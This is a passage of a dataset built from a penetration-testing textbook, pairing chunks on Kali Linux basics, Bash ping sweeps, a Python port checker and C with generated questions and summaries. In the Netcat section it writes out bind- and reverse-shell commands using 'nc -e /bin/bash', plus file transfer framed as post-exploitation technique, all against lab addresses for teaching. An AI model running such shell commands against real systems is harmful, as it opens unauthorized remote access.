    "question": "What are the key steps involved in setting up a virtual lab environment with Kali Linux, Windows 7, and Ubuntu, including configuring the network, setting up user accounts, and installing necessary software and applications?",
    "summary": "This chapter covers setting up a virtual lab environment with Kali Linux, configuring network settings, adding a user account, and learning basic Linux command line operations. It explains how to use the command line to create and manage files, directories, and user permissions, as well as how to edit files using nano and vi. The chapter also discusses the importance of using sudo for root privileges and the need to configure the virtual machine for penetration testing purposes."
  },
  {
    "start": 20,
    "end": 22,
    "text": "root@kali:~/mydirectory# vi testfile.txt\nhi\ngeorgia\nwe\nare\nteaching\npentesting\ntoday\n~\n\"testfile.txt\" 7L, 46C 1,1\nAll\nListing 2-5: Editing files with vi\nUsing Kali Linux 63\nUnlike nano, you can’t just start editing the file once it is opened in vi. To edit a file, enter I to put vi into insert mode. You should see the word\nINSERT displayed at the bottom of your terminal. Once you’ve finished\nmaking changes, press esc to exit insert mode and return to command\nmode. Once in command mode, you can use commands to edit your text. For example, position the cursor at the line we and enter dd to delete the\nword we from the file. To exit vi, enter :wq to tell vi to write the changes to the file and quit,\nas shown in Listing 2-6. hi\ngeorgia\nare\nteaching\npentesting\ntoday\n:wq\nListing 2-6: Saving changes in vi\nnote To learn more about available commands for vi and nano, read the corresponding\nman pages. Which editor you use daily is up to you. Throughout this book we’ll use\nnano to edit files, but feel free to substitute your editor of choice. data manipulation\nNow for a bit of data manipulation. Enter the text in Listing 2-7 in myfile\nusing your desired text editor. The file lists some of my favorite security\nconferences and the months when they typically happen. root@kali:~/mydirectory# cat myfile\n1 Derbycon September\n2 Shmoocon January\n3 Brucon September\n4 Blackhat July\n5 Bsides *\n6 HackerHalted October\n7 Hackcon April\nListing 2-7: Example list for data manipulation\n64 Chapter 2\nUsing grep\nThe command grep looks for instances of a text string in a file. For example,\nto search for all instances of the string September in our file, enter grep\nSeptember myfile as follows. root@kali:~/mydirectory# grep September myfile\n1 Derbycon September\n3 Brucon September\nAs you can see, grep tells us that Derbycon and Brucon are in September. Now suppose you want only the names of the conferences in Septem-\nber but not the number or the month. You can send the output of grep to\nanother command for additional processing using a pipe (|). The cut com-\nmand allows you to take each line of input, choose a delimiter, and print\nspecific fields. For example, to get just the names of conferences that run in\nSeptember you can grep for the word September as you did previously. Next,\nyou pipe (|) the output to cut, where you specify a space as the delimiter\nwith the -d option and say you want the second field with the field (-f)\noption, as shown here. root@kali:~/mydirectory# grep September myfile | cut -d \" \" -f 2\nDerbycon\nBrucon\nThe result, as you can see, is that by piping the two commands together\nyou get just the conferences Derbycon and Brucon. Using sed\nAnother command for manipulating data is sed. Entire books have been\nwritten about using sed, but we’ll cover just the basics here with a simple\nexample of finding a specific word and replacing it. The sed command is ideal for editing files automatically based on cer-\ntain patterns or expressions. Say, for instance, you have a very long file,\nand you need to replace every instance of a certain word. You can do this\nquickly and automatically with the sed command. In the language of sed, a slash (/) is the delimiter character. For\nexample, to replace all instances of the word Blackhat with Defcon in myfile,\nenter sed 's/Blackhat/Defcon/' myfile, as shown in Listing 2-8. root@kali:~/mydirectory# sed 's/Blackhat/Defcon/' myfile\n1 Derbycon September\n2 Shmoocon January\n3 Brucon September\n4 Defcon July\n5 Bsides *\n6 HackerHalted October\n7 Hackcon April\nListing 2-8: Replacing words with sed\nUsing Kali Linux 65\nPattern Matching with awk\nAnother command line utility for pattern matching is the awk command. For example, if you want to find conferences numbered 6 or greater, you\ncan use awk to search the first field for entries greater than 5, as shown here. root@kali:~/mydirectory# awk '$1 >5' myfile\n6 HackerHalted October\n7 Hackcon April\nOr, if you want only the first and third words in every line, you can\nenter awk '{print $1,$3;}' myfile, as shown in Listing 2-9. root@kali:~/mydirectory# awk '{print $1,$3;}' myfile\n1 September\n2 January\n3 September\n4 July\n5 *\n6 October\n7 April\nListing 2-9: Selecting certain columns with awk\nnote We’ve looked at only simple examples of using these data manipulation utilities in\nthis section. To get more information, consult the man pages. These utilities can be\npowerful time-savers. managing installed Packages\nOn Debian-based Linux distributions such as Kali Linux, you can use the\nAdvanced Packaging Tool (apt) to manage packages. To install a package,\nenter apt-get install package. For example, to install Raphael Mudge’s front-\nend for Metasploit, Armitage, in Kali Linux, enter the following:\nroot@kali:~# apt-get install armitage\nIt’s that easy: apt installs and configures Armitage for you. Updates are regularly released for the tools installed on Kali Linux. To\nget the latest versions of the packages already installed, enter apt-get upgrade. The repositories Kali uses for packages are listed in the file /etc/apt/sources\n.list. To add additional repositories, you can edit this file and then run\nthe command apt-get update to refresh the database to include the new\nrepositories. 66 Chapter 2\nnote This book is built off the base install of Kali 1.0.6 unless otherwise noted in\nChapter 1, so in order to follow along with the book as is, don’t update Kali. Processes and services\nIn Kali Linux you can start, stop, or restart services using the service com-\nmand. For example, to start the Apache web server, enter service apache2\nstart as shown next. root@kali:~/mydirectory# service apache2 start\n[....] Starting web server: apache2: Could not reliably determine the server's\nfully qualified domain name, using 127.0.1.1 for ServerName\n. ok\nLikewise, to stop the MySQL database server, enter service mysql stop. managing networking\nWhen setting up the Kali Linux virtual machines in Chapter 1, you\nused the ifconfig command to view network information as shown in\nListing 2-10. root@kali:~# ifconfig\neth0u Link encap:Ethernet HWaddr 00:0c:29:df:7e:4d\ninet addr:192.168.20.9v Bcast:192.168.20.255 Mask:255.255.255.0w\ninet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\nRX packets:1756332 errors:930193 dropped:17 overruns:0 frame:0\nTX packets:1115419 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:1048617759 (1000.0 MiB) TX bytes:115091335 (109.7 MiB)\nInterrupt:19 Base address:0x2024\n--snip--\nListing 2-10: Viewing networking information with ifconfig\nFrom the output of ifconfig you can glean a lot of information about\nyour system’s network state. For one, the network interface is called eth0 u. The IPv4 address (inet addr) that my Kali box uses to talk to the network\nis 192.168.20.9 v (yours will probably differ). An IP address is a 32-bit label\nassigned to devices in a network. The IP address is named up of 4 octets,\nor 8-bit parts. Using Kali Linux 67\nThe address’s network mask, or netmask (Mask), at w identifies which parts\nof the IP address are part of the network and which parts belong to the\nhost. In this case the netmask 255.255.255.0 tells you that the network is the\nfirst three octets, 192.168.20. The default gateway is where your host routes traffic to other networks. Any traffic destined outside the local network will be sent to the default\ngateway for it to figure out where it needs to go. root@kali:~# route\nKernel IP routing table\nDestination Gateway Genmask Flags Metric Ref Use Iface\ndefault 192.168.20.1u 0.0.0.0 UG 0 0 0 eth0\n\n192.168.20.0 * 255.255.255.0 U 0 0 0 eth0\nThe route command output tells us that the default gateway is\n\n192.168.20.1 u. This makes sense because the system with the IP\naddress 192.168.20.1 is the wireless router in my home network. Take\nnote of your own default gateway for use in the following section. Setting a Static IP Address\nBy default, your network connection uses dynamic host configuration\nprotocol (DHCP) to pull an IP address from the network. To set a static\naddress, so that your IP address won’t change, you need to edit the file\n/etc/network/interfaces. Use your preferred editor to open this file. The\ndefault configuration file is shown in Listing 2-11. # This file describes the network interfaces available on your system\n# and how to activate them. For more information, see interfaces(5). # The loopback network interface\nauto lo\niface lo inet loopback\nListing 2-11: The default /etc/network/interfaces file\nTo give your system a static IP address you need to add an entry for the\neth0 interface. Add the text shown in Listing 2-12 to /etc/network/interfaces\nwith the IP addresses changed to match your environment. # This file describes the network interfaces available on your system\n# and how to activate them. For more information, see interfaces(5). # The loopback network interface\nauto lo\niface lo inet loopback\nauto eth0\niface eth0 inet static u\naddress 192.168.20.9\n68 Chapter 2\nnetmask 255.255.255.0 v\ngateway 192.168.20.1 w\nListing 2-12: Adding a static IP address\nYou set the IP address for eth0 as static at u. Use the IP address, net-\nmask , and gateway  you found in the previous section to fill in the\ninformation in your file. Once you’ve made these changes, restart networking with service\nnetworking restart so that the newly added static networking information\nwill be used. Viewing Network Connections\nTo view network connections, listening ports, and so on, use the netstat\ncommand. For example, you can see the programs listening on TCP ports\nby issuing the command netstat -antp, as shown in Listing 2-13. Ports are\nsimply software-based network sockets that listen on the network to allow\nremote systems to interact with programs on a system. root@kali:~/mydirectory# netstat -antp\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address Foreign Address State\nPID/Program name\ntcp6 0 0 :::80 :::* LISTEN\n15090/apache2\nListing 2-13: Using netstat to view listening ports\nYou see that the Apache web server you started earlier in the chapter is\nlistening on TCP port 80. (See the man page for other netstat options.)\nnetcat: the swiss army knife of tCP/iP Connections\nAs the man page notes, the Netcat tool is known as the Swiss Army knife\nfor TCP/IP connections. It’s a versatile tool that we’ll utilize throughout\nthis book. To see Netcat’s various options enter nc -h, as shown in Listing 2-14. root@kali:~# nc -h\n[v1.10-40]\nconnect to somewhere: nc [-options] hostname port[s] [ports] ... listen for inbound: nc -l -p port [-options] [hostname] [port]\noptions:\n-c shell commands as `-e'; use /bin/sh to exec [dangerous!!]\n-e filename program to exec after connect [dangerous!!]\n-b allow broadcasts\n--snip--\nListing 2-14: Netcat help information\nUsing Kali Linux 69\nCheck to See If a Port Is Listening\nLet’s have Netcat connect to a port to see if that port is listening for connec-\ntions. You saw previously that the Apache web server is listening on port 80\non your Kali Linux system. Tell Netcat to attach to port 80 verbosely, or out-\nput rich, with the -v option as shown next. If you started Apache correctly,\nyou should see the following when attempting to connect the service. root@kali:~# nc -v 192.168.20.9 80\n(UNKNOWN) [192.168.20.10] 80 (http) open\nAs you can see, Netcat reports that port 80 is indeed listening (open) on\nthe network. (We’ll look more at open ports and why they are interesting in\nChapter 5’s discussion of port scanning.)\nYou can also listen on a port for an incoming connection using Netcat,\nas shown next. root@kali:~# nc -lvp 1234\nlistening on [any] 1234 ... You use the options l for listen, v for verbose, and p to specify the port\nto listen on. Next, open a second terminal window and use Netcat to connect to the\nNetcat listener. root@kali:~# nc 192.168.20.9 1234\nhi georgia\nOnce you connect, enter the text hi georgia, and when you return to the\nlistener’s terminal window, you see that a connection was received and your\ntext was printed. listening on [any] 1234 ... connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51917\nhi georgia\nClose down both Netcat processes by pressing ctrl-C. Opening a Command Shell Listener\nNow for something a bit more interesting. When you set up your Netcat\nlistener, use the -e flag to tell Netcat to execute /bin/bash (or start a Bash\ncommand prompt) when a connection is received. This allows anyone who\nconnects to the listener to execute commands on your system, as shown next. root@kali:~# nc -lvp 1234 -e /bin/bash\nlistening on [any] 1234 ... Again, use a second terminal window to connect to the Netcat listener. 70 Chapter 2\nroot@kali:~# nc 192.168.20.9 1234\nwhoami\nroot\nYou can now issue Linux commands to be executed by the Netcat lis-\ntener. The whoami Linux command will tell you the current logged-in user. In this case, because the Netcat process was started by the root user, your\ncommands will be executed as root. note This is a simple example because both your Netcat listener and the connection are on\nthe same system. You could use another of your virtual machines, or even your host\nsystem, for this exercise as well. Close down both Netcat processes again. Pushing a Command Shell Back to a Listener\nIn addition to listening on a port with a command shell, you can also push\na command shell back to a Netcat listener. This time set up the Netcat lis-\ntener without the -e flag as shown next. root@kali:~# nc -lvp 1234\nlistening on [any] 1234 ... Now open a second terminal, and connect back to the Netcat listener\nyou just created as shown here. root@kali:~# nc 192.168.20.9 1234 -e /bin/bash\nConnect with Netcat as usual, but this time use the -e flag to execute\n/bin/bash on the connection. Back in your first terminal you see a connec-\ntion as shown next, and if you enter terminal commands, you will see them\nexecuted. (We’ll learn more about listening with /bin/bash on a local port\nand actively pushing /bin/bash with a connection, known as bind shells and\nreverse shells, respectively, in Chapter 4.)\nlistening on [any] 1234 ... connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51921\nwhoami\nroot\nNow, one more thing with Netcat. This time, instead of outputting what\ncomes into your listener to the screen, use > to send it to a file as shown next. root@kali:~# nc -lvp 1234 > netcatfile\nlistening on [any] 1234 ... In the second terminal you set up Netcat to connect, but this time you\nuse the < symbol to tell it to send the contents of a file (myfile) over the\nUsing Kali Linux 71\nNetcat connection. Give Netcat a second or two to finish, and then examine\nthe contents of the file netcatfile created by your first Netcat instance. The\ncontents should be identical to myfile. root@kali:~# nc 192.168.20.9 1234 < mydirectory/myfile\nYou have used Netcat to transfer the file. In this case we’ve simply trans-\nferred the file from one directory to another, but you can imagine how this\ntechnique can be used to transfer files from system to system—a technique\nthat often comes in handy in the post-exploitation phase of a pentest, once\nyou have access to a system. automating tasks with cron Jobs\nThe cron command allows us to schedule tasks to automatically run at a\nspecified time. In the /etc directory in Kali, you can see several files and\ndirectories related to cron, as shown in Listing 2-15. root@kali:/etc# ls | grep cron\ncron.d\ncron.daily\ncron.hourly\ncron.monthly\ncrontab\ncron.weekly\nListing 2-15: crontab files\nThe cron.daily, cron.hourly, cron.monthly, and cron.weekly directories spec-\nify scripts that will run automatically, every day, every hour, every month, or\nevery week, depending on which directory you put your script in. If you need more flexibility you can edit cron’s configuration file, /etc/\ncrontab. The default text is shown in Listing 2-16. # /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do. SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly u\n25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) v\n47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\nListing 2-16: crontab configuration file\n72 Chapter 2\nThe fields in a crontab are, from left to right, the minute, hour, day of\nthe month, month, day of the week, user who will run the command, and,\nfinally, the command to be run. To run a command every day of the week,\nevery hour, and so on, you use an asterisk (*) instead of specifying a value\nfor the column. For example, look at the first crontab line at u, which runs the hourly\ncron jobs specified in /etc/cron.hourly. This crontab runs on the 17th minute\nof every hour every day of every month on every day of the week. The line\nat v says that the daily crontab (/etc/cron.daily) will be run at the 25th min-\nute of the 6th hour of every day of every month on every day of the week. (For\nmore flexibility, you can add a line here instead of adding to the hourly, daily,\nweekly, or monthly lists.)\nsummary\nIn this chapter we’ve looked at some common Linux tasks. Navigating the\nLinux filesystem, working with data, and running services are all skills that\nwill serve you well as you move through the rest of this book. In addition,\nwhen attacking Linux systems, knowing which commands to run in a Linux\nenvironment will help you make the most of successful exploitation. You\nmay want to automatically run a command periodically by setting up a cron\njob or use Netcat to transfer a file from your attack machine. You will use\nKali Linux to run your attacks throughout this book, and one of your target\nsystems is Ubuntu Linux, so having the basics in place will make learning\npentesting come more naturally. Using Kali Linux 73\n3\nProgr amming\nIn this chapter we will look at some basic examples\nof computer programming. We will look at writing\nprograms to automate various useful tasks in multiple\nprogramming languages. Even though we use prebuilt\nsoftware for the majority of this book, it is useful to be\nable to create your own programs. Bash scripting\nIn this section we’ll look at using Bash scripts to run several commands\nat once. Bash scripts, or shell scripts, are files that include multiple terminal\ncommands to be run.",
    "question": "What are some common Linux tasks discussed in this section and how can they be accomplished using tools like vi, grep, cut, sed, awk, apt, service, ifconfig, route, netstat, and cron?",
    "summary": "This chapter covers basic programming examples in multiple languages, focusing on automating tasks. It includes using Bash scripts to execute multiple commands and discusses tools like Netcat for file transfer and cron jobs for scheduling tasks. The text also explains how to manage packages, network settings, and services in Kali Linux."
  },
  {
    "start": 23,
    "end": 31,
    "text": "Any command we can run in a terminal can be run\nin a script. Ping\nWe’ll call our first script pingscript.sh. When it runs, this script will perform\na ping sweep on our local network that sends Internet Control Message\nProtocol (ICMP) messages to remote systems to see if they respond. We’ll use the ping tool to determine which hosts are reachable on a net-\nwork. (Although some hosts may not respond to ping requests and may be\nup despite not being “pingable,” a ping sweep is still a good place to start.)\nBy default, we supply the IP address or hostname to ping. For example, to\nping our Windows XP target, enter the bold code in Listing 3-1. root@kali:~/# ping 192.168.20.10\nPING 192.168.20.10 (192.168.20.10) 56(84) bytes of data. 64 bytes from 192.168.20.10: icmp_req=1 ttl=64 time=0.090 ms\n64 bytes from 192.168.20.10: icmp_req=2 ttl=64 time=0.029 ms\n64 bytes from 192.168.20.10: icmp_req=3 ttl=64 time=0.038 ms\n64 bytes from 192.168.20.10: icmp_req=4 ttl=64 time=0.050 ms\n^C\n--- 192.168.20.10 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 2999 ms\nrtt min/avg/max/mdev = 0.029/0.051/0.090/0.024 ms\nListing 3-1: Pinging a remote host\nWe can tell from the ping output that the Windows XP target is up\nand responding to ping probes because we received replies to our ICMP\nrequests. (The trouble with ping is that it will keep running forever unless\nyou stop it with ctrl-C.)\nA Simple Bash Script\nLet’s begin writing a simple Bash script to ping hosts on the network. A good\nplace to start is by adding some help information that tells your users how\nto run your script correctly. #!/bin/bash\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nThe first line of this script tells the terminal to use the Bash interpreter. The next two lines that begin with echo simply tell the user that our ping\nscript will take a command line argument (network), telling the script which\nnetwork to ping sweep (for example, 192.168.20). The echo command will\nsimply print the text in quotes. note This script implies we are working with a class C network, where the first three octets\nof the IP address make up the network. After creating the script, use chmod to make it executable so we can run it. root@kali:~/# chmod 744 pingscript.sh\n76 Chapter 3\nRunning Our Script\nPreviously, when entering Linux commands, we typed the command\nname at the prompt. The filesystem location of built-in Linux commands\nas well as pentest tools added to Kali Linux are part of our PATH environ-\nmental variable. The PATH variable tells Linux which directories to search\nfor executable files. To see which directories are included in our PATH,\nenter echo $PATH. root@kali:~/# echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nNotice in the output that the /root directory is not listed. That means that\nwe won’t be able to simply enter pingscript.sh to run our Bash script. Instead\nwe’ll enter ./pingscript.sh to tell the terminal to run the script from our\ncurrent directory. As shown next, the script prints the usage information. root@kali:~/# ./pingscript.sh\nUsage: ./pingscript.sh [network]\nexample: ./pingscript.sh 192.168.20\nAdding Functionality with if Statements\nNow let’s add in a bit more functionality with an if statement, as shown in\nListing 3-2. #!/bin/bash\nif [ \"$1\" == \"\" ] u\nthen v\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nfi w\nListing 3-2: Adding an if statement\nTypically a script needs to print usage information only if the user\nuses it incorrectly. In this case, the user needs to supply the network to\nscan as a command line argument. If the user fails to do so, we want to\ninform the user how to run our script correctly by printing the usage\ninformation. To accomplish this, we can use an if statement to see if a condition is\nmet. By using an if statement, we can have our script echo the usage infor-\nmation only under certain conditions—for example, if the user does not\nsupply a command line argument. The if statement is available in many programming languages, though\nthe syntax varies from language to language. In Bash scripting, an if state-\nment is used like this: if [condition], where condition is the condition that\nmust be met. Programming 77\nIn the case of our script, we first see whether the first command line\nargument is null u. The symbol $1 represents the first command line argu-\nment in a Bash script, and double equal signs (==) check for equality. After\nthe if statement, we have a then statement v. Any commands between the\nthen statement and the fi (if backward) w are executed only if the condi-\ntional statement is true—in this case, when the first command line argu-\nment to the script is null. When we run our new script with no command line argument, the if\nstatement evaluates as true, because the first command line argument is\nindeed null, as shown here. root@kali:~/# ./pingscript.sh\nUsage: ./pingscript.sh [network]\nexample: ./pingscript.sh 192.168.20\nAs expected we see usage information echoed to the screen. A for Loop\nIf we run the script again with a command line argument, nothing hap-\npens. Now let’s add some functionality that is triggered when the user runs\nthe script with the proper arguments, as shown in Listing 3-3. #!/bin/bash\nif [ \"$1\" == \"\" ]\nthen\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nelse u\nfor x in `seq 1 254`; do v\nping -c 1 $1.$x\ndone w\nfi\nListing 3-3: Adding a for loop\nAfter our then statement, we use an else statement u to instruct the\nscript to run code when the if statement evaluates as false—in this case, if\nthe user supplies a command line argument. Because we want this script\nto ping all possible hosts on the local network, we need to loop through\nthe numbers 1 through 254 (the possibilities for the final octet of an\nIP version 4 address) and run the ping command against each of these\npossibilities. An ideal way to run through sequential possibilities is with a for loop v. Our for loop, for x in `seq 1 254`; do, tells the script to run the code that\nfollows for each number from 1 to 254. This will allow us to run one set of\ninstructions 254 times rather than writing out code for each instance. We\ndenote the end of a for loop with the instruction done w. 78 Chapter 3\nInside the for loop, we want to ping each of the IP addresses in the net-\nwork. Using ping’s man page, we find that the -c option will allow us to limit\nthe number of times we ping a host. We set -c to 1 so that each host will be\npinged just once. To specify which host to ping, we want to concatenate the first command\nline argument (which denotes the first three octets) with the current itera-\ntion of the for loop. The full command to use is ping -c 1 $1.$x. Recall\nthat the $1 denotes the first command line argument, and $x is the cur-\nrent iteration of the for loop. The first time our for loop runs, it will ping\n\n192.168.20.1, then 192.168.20.2, all the way to 192.168.20.254. After itera-\ntion 254, our for loop finishes.\nWhen we run our script with the first three octets of our IP address as\nthe command line argument, the script pings each IP address in the net-\nwork as shown in Listing 3-4.\nroot@kali:~/# ./pingscript.sh 192.168.20\nPING 192.168.20.1 (192.168.20.1) 56(84) bytes of data.\n64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=8.31 ms u\n--- 192.168.20.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 8.317/8.317/8.317/0.000 ms\nPING 192.168.20.2(192.168.20.2) 56(84) bytes of data.\n64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=166 ms\n--- 192.168.20.2 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 166.869/166.869/166.869/0.000 ms\nPING 192.168.20.3 (192.168.20.3) 56(84) bytes of data.\nFrom 192.168.20.13 icmp_seq=1 Destination Host Unreachable v\n--- 192.168.20.3 ping statistics ---\n1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms\n--snip--\nListing 3-4: Running the ping sweep script\nYour results will vary based on the systems in your local network. Based\non this output, I can tell that in my network, the host 192.168.20.1 is up, and\nI received an ICMP reply u. On the other hand, the host 192.168.20.3 is not\nup, so I received a host unreachable notification v.\nStreamlining the Results\nAll this information printed to screen is not very nice to look at, and anyone\nwho uses our script will need to sift through a lot of information to deter-\nmine which hosts in the network are up. Let’s add some additional func-\ntionality to streamline our results.\nProgramming 79\nIn the previous chapter we covered grep, which searches for and\nmatches specific patterns. Let’s use grep to filter the script’s output, as\nshown in Listing 3-5.\n#!/bin/bash\nif [ \"$1\" == \"\" ]\nthen\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nelse\nfor x in `seq 1 254`; do\nping -c 1 $1.$x | grep \"64 bytes\" u\ndone\nfi\nListing 3-5: Using grep to filter results\nHere we look for all instances of the string 64 bytes u, which occurs\nwhen an ICMP reply is received when pinging a host. If we run the script\nwith this change, we see that only lines that include the text 64 bytes are\nprinted to the screen, as shown here.\nroot@kali:~/# ./pingscript.sh 192.168.20\n64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=4.86 ms\n64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=68.4 ms\n64 bytes from 192.168.20.8: icmp_req=1 ttl=64 time=43.1 ms\n--snip--\nWe get indicators only for live hosts; hosts that do not answer are not\nprinted to the screen.\nBut we can make this script even nicer to work with. The point of our\nping sweep is to get a list of live hosts. By using the cut command discussed\nin Chapter 2, we can print the IP addresses of only the live hosts, as shown in\nListing 3-6.\n#!/bin/bash\nif [ \"$1\" == \"\" ]\nthen\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nelse\nfor x in `seq 1 254`; do\nping -c 1 $1.$x | grep \"64 bytes\" | cut -d\" \" -f4 u\ndone\nfi\nListing 3-6: Using cut to further filter results\nWe can use a space as the delimiter and grab the fourth field, our IP\naddress, as shown at u.\n80 Chapter 3\nNow we run the script again as shown here.\nroot@kali:~/mydirectory# ./pingscript.sh 192.168.20\n\n192.168.20.1:\n\n192.168.20.2:\n\n192.168.20.8:\n--snip--\nUnfortunately, we see a trailing colon at the end of each line. The results\nwould be clear enough to a user, but if we want to use these results as input\nfor any other programs, we need to delete the trailing colon. In this case,\nsed is the answer.\nThe sed command that will delete the final character from each line is\nsed 's/.$//', as shown in Listing 3-7.\n#!/bin/bash\nif [ \"$1\" == \"\" ]\nthen\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nelse\nfor x in `seq 1 254`; do\nping -c 1 $1.$x | grep \"64 bytes\" | cut -d\" \" -f4 | sed 's/.$//'\ndone\nfi\nListing 3-7: Using sed to drop the trailing colon\nNow when we run the script, everything looks perfect, as shown here.\nroot@kali:~/# ./pingscript.sh 192.168.20\n\n192.168.20.1\n\n192.168.20.2\n\n192.168.20.8\n--snip--\nnote Of course, if we want to output the results to a file instead of to the screen, we can use\nthe >> operator, covered in Chapter 2, to append each live IP address to a file. Try\nautomating other tasks in Linux to practice your Bash scripting skills. Python scripting\nLinux systems typically come with interpreters for other scripting languages\nsuch as Python and Perl. Interpreters for both languages are included in\nKali Linux. In Chapters 16 through 19, we’ll use Python to write our own\nexploit code. For now, let’s write a simple Python script and run it in Kali\nLinux just to demonstrate the basics of Python scripting. Programming 81\nFor this example we’ll do something similar to our first Netcat example\nin Chapter 2: We’ll attach to a port on a system and see if the port is listen-\ning. A starting point for our script is shown here. #!/usr/bin/python u\nip = raw_input(\"Enter the ip: \") v\nport = input(\"Enter the port: \") w\nIn the previous section, the first line of our script told the terminal to\nuse Bash to interpret the script. We do the same thing here, pointing to the\nPython interpreter installed on Kali Linux at /usr/bin/python u. We’ll begin by prompting the user for data and recording input into\nvariables. The variables will store the input for use later in the script. To\ntake input from the user, we can use the Python function raw_input v. We\nwant to save our port as an integer, so we use a similar built-in Python func-\ntion, input, at w. Now we ask the user to input an IP address and a port to test. After saving the file, use chmod to make the script executable before run-\nning the script, as shown here. root@kali:~/mydirectory# chmod 744 pythonscript.py\nroot@kali:~/mydirectory# ./pythonscript.py\nEnter the ip: 192.168.20.10\nEnter the port: 80\nWhen you run the script, you’re prompted for an IP address and a port,\nas expected. Now we will add in some functionality to allow us to use the user’s input\nto connect to the chosen system on the selected port to see if it is open\n(Listing 3-8). #!/usr/bin/python\nimport socket u\nip = raw_input(\"Enter the ip: \")\nport = input(\"Enter the port: \")\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM) v\nif s.connect_ex((ip, port)): w\nprint \"Port\", port, \"is closed\" x\nelse: y\nprint \"Port\", port, \"is open\"\nListing 3-8: Adding port-scanning functionality\nTo perform networking tasks in Python, we can include a library called\nsocket using the command import socket u. The socket library does the heavy\nlifting for setting up a network socket. The syntax for creating a TCP network socket is socket.socket(socket.AF_\nINET, socket.SOCK_STREAM). We set a variable equal to this network socket at v. 82 Chapter 3\nConnecting to a Port\nWhen creating a socket to connect to a remote port, the first candidate\navailable from Python is the socket function connect. However, there is\na better candidate for our purposes in the similar function, connect_ex. According to the Python documentation, connect_ex is like connect except\nthat it returns an error code instead of raising an exception if the connec-\ntion fails. If the connection succeeds, connect_ex will return the value 0. Because we want to know whether the function can connect to the port,\nthis return value seems ideal to feed into an if statement. if Statements in Python\nWhen building if statements in Python, we enter if condition:. In Python the\nstatements that are part of a conditional or loop are denoted with inden-\ntations rather than ending markers, as we saw in Bash scripting. We can\ninstruct our if statement to evaluate the returned value of the connection\nof our TCP socket to the user-defined IP address and port with the com-\nmand if s.connect_ex((ip, port)): w. If the connection succeeds, connect_ex\nwill return 0, which will be evaluated by the if statement as false. If the con-\nnection fails, connect_ex will return a positive integer, or true. Thus, if our if\nstatement evaluates as true, it stands to reason that the port is closed, and\nwe can present this to the user using the Python print command at x. And,\nas in the Bash scripting example, if connect_ex returns 0 at y, we can use an\nelse statement (the syntax is else: in Python) to instead inform the user\nthat the tested port is open. Now, run the updated script to test whether TCP port 80 is running on\nthe Windows XP target host as shown here. root@kali:~/# ./pythonscript.py\nEnter the ip: 192.168.20.10\nEnter the port: 80\nPort 80 is open\nAccording to our script, port 80 is open. Now run the script again\nagainst port 81. root@kali:~/# ./pythonscript.py\nEnter the ip: 192.168.20.10\nEnter the port: 81\nPort 81 is closed\nThis time, the script reports that port 81 is closed. note We will look at checking open ports in Chapter 5, and we will return to Python script-\ning when we study exploit development. Kali Linux also has interpreters for the Perl\nand Ruby languages. We will learn a little bit of Ruby in Chapter 19. It never hurts\nto know a little bit of multiple languages. If you are up for a challenge, see if you can\nre-create this script in Perl and Ruby. Programming 83\nwriting and Compiling C Programs\nTime for one more simple programming example, this time in the C pro-\ngramming language. Unlike scripting languages such as Bash and Python,\nC code must be compiled and translated into machine language that the\nCPU can understand before it is run. Kali Linux includes the GNU Compiler Collection (GCC), which will\nallow us to compile C code to run on the system. Let’s create a simple C pro-\ngram that says hello to a command line argument, as shown in Listing 3-9. #include <stdio.h> u\nint main(int argc, char *argv[]) v\n{\nif(argc < 2) w\n{\nprintf(\"%s\\n\", \"Pass your name as an argument\"); x\nreturn 0; y\n}\nelse\n{\nprintf(\"Hello %s\\n\", argv[1]); z\nreturn 0;\n}\n}\nListing 3-9: “Hello World” C program\nThe syntax for C is a bit different from that of Python and Bash. Because\nour code will be compiled, we don’t need to tell the terminal which inter-\npreter to use at the beginning of our code. First, as with our Python example,\nwe import a C library. In this case we’ll import the stdio (short for standard\ninput and output) library, which will allow us to accept input and print\noutput to the terminal. In C, we import stdio with the command #include\n<stdio.h> u. Every C program has a function called main v that is run when the\nprogram starts. Our program will take a command line argument, so we\npass an integer argc and a character array argv to main. argc is the argument\ncount, and argv is the argument vector, which includes any command line\narguments passed to the program. This is just standard syntax for C pro-\ngrams that accept command line arguments. (In C, the beginning and end\nof functions, loops, and so on are denoted by braces {}.)\nFirst, our program checks to see if a command line argument is pres-\nent. The argc integer is the length of the 